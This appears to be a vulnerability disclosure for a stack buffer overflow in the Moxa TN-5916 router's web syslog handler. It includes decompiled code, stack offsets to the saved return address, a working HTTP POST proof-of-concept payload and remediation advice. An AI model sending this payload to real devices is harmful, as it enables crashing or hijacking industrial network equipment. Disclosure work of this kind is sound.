# Moxa TN-5916 v3.2/v3.3 was discovered to contain a stack buffer overflow in the web syslog configuration handler

## Overview

- Vendor: Moxa
- Product: TN-5900-series / TN-5916 industrial security router
- Version: v3.2 and v3.3
- Component: magicP/WebServer/webs, syslog configuration handler
- Vulnerability Class: CWE-121 stack buffer overflow
- CVSS 3.1 (tentative): 8.0 High `AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (authenticated web session; 9.8 if the handler is reachable without authentication)
- Manufacturer: https://www.moxa.com/

## Affected versions

### v3.2 (2021-12)

- `moxa-tn-5900-series-firmware-v3.2.rom`.
- CramFS.
- `magicP/WebServer/webs`.

### v3.3 (2022-10)

- `moxa-tn-5900-series-firmware-v3.3.rom`.
- CramFS.
- `magicP/WebServer/webs`.

## Vulnerability details

`syslog.asp` posts a single `syslogTemp` string containing nine
`+`-separated fields per record (`server1`-`server3` are hostnames or
IP addresses; the remaining fields are numbers). `websGetVar` returns
the raw string.

`net_WebSyslogGetValue` copies each field into a 132-byte stack buffer
with an unbounded loop that stops only at `+`, not at a length or at the
end of the destination:

```c
char v15[132];              // sp+0x2ec
...
memset(v15, 0, 0x40);
v4 = 0;
while (Var[v6] != '+')
    v15[v4++] = Var[v6++];
memset(&v15[64], 0, 0x40);
strcpy((char *)&v13[16 * k + 3], v15);
```

Every field uses the same loop, including the numeric fields, so a
single oversized field (or a final field with no `+`, which makes the
loop read past the end of the NUL-terminated string) overwrites `v15`,
the adjacent locals and the saved frame. The `memset(..., 0x40)` does
not bound the copy.

The v3.3 frame allocates 960 bytes and saves `ra` at `sp+0x3b0`;
`v15` is at `sp+0x2ec`, so 196 bytes of `v15` reach the saved return
address. The v3.2 build has the same frame and loop. There is no stack
canary check in the function.

## PoC

```http
POST /goform/net_WebSyslogGetValue HTTP/1.1
Host: <router>
Content-Type: application/x-www-form-urlencoded
Cookie: <authenticated web session>

syslogTemp=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+1+2+3+4+5+6+7+8+9
```

The first field is longer than 196 bytes; the server copies it into
`v15` until the first `+` and overwrites the saved `ra`. At minimum this
crashes/restarts the web server; with a MIPS64 ROP chain it is a code
execution candidate.

## Verification

The vulnerable handler in the stock `magicP/WebServer/webs, syslog configuration handler` was decompiled from the unpacked rootfs; the relevant code and offsets are quoted above. No dynamic run was completed.

## Impact

An authenticated web user can crash the `webs` process and potentially
execute code in its MIPS64 context. The web server runs with the
privileges of the management service; the exact post-exploitation
impact depends on the MIPS64 runtime layout.

## Remediation / known-CVE relation

- Parse each field with a bounded copy (`strncpy` with an explicit
  destination size, then NUL-terminate) and reject fields that do not
  fit.
- Stop the loop at both `+` and `\0`; reject a missing terminator.
- Add a stack canary and compile the web server with `-fstack-protector`.
- NVD keyword searches on 2026-11-08 for `net_WebSyslogGetValue`,
  `syslogTemp Moxa`, `net_WebAccessGetValue`, `ipTemp Moxa`,
  `net_WebIPCLIENTGetValue` and `Moxa TN-5916 buffer overflow` returned
  zero results. Candidate 0-day; CVE application in progress.

## Additional Information

```markdown
### Vendor
Moxa

### Product
TN-5900-series / TN-5916 industrial security router

### Version or Commit
v3.2 and v3.3

### Vulnerability Class
CWE-121 stack buffer overflow

### CVE_status
CVE application in progress

### Description
syslog.asp submits a syslogTemp string with nine +-separated fields; the handler copies it into fixed stack buffers without bounds checks.

### Affected_component
magicP/WebServer/webs, syslog configuration handler

### Attack_vector
Authenticated POST to the syslog /goform endpoint with an oversized syslogTemp value.

### Product_version
TN-5900-series / TN-5916 industrial security router v3.2 and v3.3

### Reference
- https://www.moxa.com/
- https://github.com/vuln-1/vuln/blob/main/Moxa/TN-5916_V3.2/report-7.md
```
